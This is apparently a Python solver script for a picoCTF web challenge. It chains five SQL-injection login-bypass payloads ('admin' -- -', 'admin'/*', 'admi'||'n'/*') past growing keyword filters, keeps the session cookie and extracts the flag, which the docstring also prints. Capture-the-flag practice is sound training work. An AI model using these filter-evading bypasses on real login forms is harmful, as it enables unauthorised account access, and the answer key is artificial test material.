"""Solver for challenge 88 Web Gauntlet (picoCTF 2020 Mini-Competition, Web).

5-round SQLi login gauntlet. Each round filters more tokens; beat every
round by logging in as admin without valid credentials, then read the flag
from filter.php (round counter >= 6 highlights the source with the flag).

Payload chain (session cookie must persist across all 5 rounds):
  R1 (filter: or)            -> admin' -- -
  R2 (filter: or and like = --)        -> admin'/*
  R3 (filter: <space> or and = like > < --) -> admin'/*
      (the C-style comment opener smuggles a trailing space so the query
       stays valid without using a literal space or '--')
  R4 (+ admin)               -> admi'||'n'/*
      (string concatenation rebuilds 'admin' without the literal word)
  R5 (+ union)               -> admi'||'n'/*

After round 5, GET filter.php -> academy{y0u_m4d3_1t_ecb312a6}
"""
import sys
import urllib.parse
import urllib.request

PAYLOADS = [
    "admin' -- -",
    "admin'/*",
    "admin'/*",
    "admi'||'n'/*",
    "admi'||'n'/*",
]


def solve(base: str) -> str:
    base = base.rstrip('/')
    jar: dict = {}

    def req(path: str, data: dict | None = None) -> str:
        r = urllib.request.Request(base + path,
                                   data=urllib.parse.urlencode(data).encode() if data else None,
                                   headers={'Cookie': '; '.join(f'{k}={v}' for k, v in jar.items())})
        with urllib.request.urlopen(r, timeout=20) as resp:
            for h, v in resp.getheaders():
                if h.lower() == 'set-cookie':
                    kv = v.split(';')[0]
                    if '=' in kv:
                        k, vv = kv.split('=', 1)
                        jar[k.strip()] = vv.strip()
            return resp.read().decode(errors='replace')

    req('/filter.php')  # establish session
    for i, p in enumerate(PAYLOADS, 1):
        body = req('/index.php', {'user': p, 'pass': 'x'})
        assert f'Round {i + 1}' in body or 'You won' in body, f'round {i} failed'
    flag_page = req('/filter.php')
    import re
    m = re.search(r'academy\{[^}]+\}', flag_page)
    assert m, 'flag not found'
    return m.group(0)


if __name__ == '__main__':
    print(solve(sys.argv[1] if len(sys.argv) > 1 else 'http://chatelaine.cylabacademy.net:30362'))
